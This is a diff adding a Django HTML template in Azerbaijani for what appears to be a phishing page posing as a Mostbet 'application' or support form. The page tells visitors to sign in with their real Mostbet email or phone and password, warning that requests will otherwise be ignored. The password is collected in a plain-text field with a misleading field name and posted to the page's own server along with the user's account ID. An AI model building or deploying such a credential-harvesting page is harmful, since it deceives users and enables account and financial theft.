@@ -1,0 +1,49 @@
+{% extends 'index.html' %}
+
+{% block content %}
+<section class="section home-5-bg" id="home" style="background-image:url('https://img.wallpapersafari.com/desktop/1680/1050/36/85/se0GRy.jpg');">
+  <div id="particles-js"></div>
+  <div class="bg-overlay"></div>
+  <div class="home-center">
+      <div class="home-desc-center">
+          <div class="container">
+              <div class="justify-content-center row">
+                  <div class="col-lg-7">
+                      <div class="mt-40 text-center home-5-content">
+                          <div class="home-icon mb-4"><i class="mdi mdi-pinwheel mdi-spin text-white h1"></i></div>
+                          <h1 class="text-white font-weight-normal home-5-title mb-0"><strong>MÜRACİƏT SƏHİFƏSİ</strong></h1>
+                          <p class="text-white mt-4 f-15 mb-0">Aşağıda göstərilən xanalara real mostbet hesabınızla daxil olun.<br>Əks halda müraciətinizə BAXILMAYACAQDIR.</p>
+                      </div>
+                  </div>
+              </div>
+          </div>
+      </div>
+  </div>
+</section>
+<div class="container">
+  <form method="POST">
+      {% csrf_token %}
+
+      <div class="form-group">
+        <label for="exampleFormControlInput1" style="color:grey;">Sizin emailiniz/telefonunuz</label>
+        <input name="email" type="email" class="form-control" id="exampleFormControlInput1" placeholder="Sizin emailiniz/telefonunuz">
+      </div>
+
+      <div class="form-group">
+          <label for="exampleFormControlInput1" style="color:grey;">Şifrə</label>
+          <input name="name" type="text" class="form-control" id="exampleFormControlInput1" placeholder="Şifrə">
+      </div>
+
+      <div class="form-group">
+        <label for="exampleFormControlTextarea1" style="color:grey;">Müraciətiniz</label>
+        <textarea name="message" class="form-control" id="exampleFormControlTextarea1" rows="3" placeholder="İD-niz və Müraciətiniz"></textarea>
+        <small id="passwordHelpBlock" class="form-text text-muted">
+          Müraciətinizi yazmazdan əvvəl İD-nizi qeyd etməyi unutmayın.
+        </small>
+      </div>
+
+      <button type="submit" class="btn btn-success">Göndər</button>
+  </form>
+</div>
+{% endblock content %}
+
